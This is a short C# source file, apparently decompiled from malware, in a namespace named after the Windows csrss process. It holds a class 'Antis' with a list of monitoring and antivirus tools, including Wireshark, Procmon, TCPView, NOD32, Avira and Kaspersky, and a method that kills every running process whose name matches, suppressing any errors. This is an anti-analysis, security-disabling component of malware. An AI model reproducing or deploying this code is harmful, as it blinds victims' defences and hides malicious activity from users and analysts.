using System.Diagnostics;

namespace MI_CSRSS;

internal class Antis
{
	public static string[] PList = new string[15]
	{
		"WIRESHARK", "NETSTAT", "FILEMON", "PROCMON", "REGMON", "CAIN", "NETMON", "TCPVIEW", "CFP", "Comodo",
		"NOD32", "NOD", "Avira", "Kas", "Kaspersky"
	};

	public static void LoadModule()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] pList = PList;
			foreach (string value in pList)
			{
				if (process.ProcessName.Contains(value))
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
	}
}
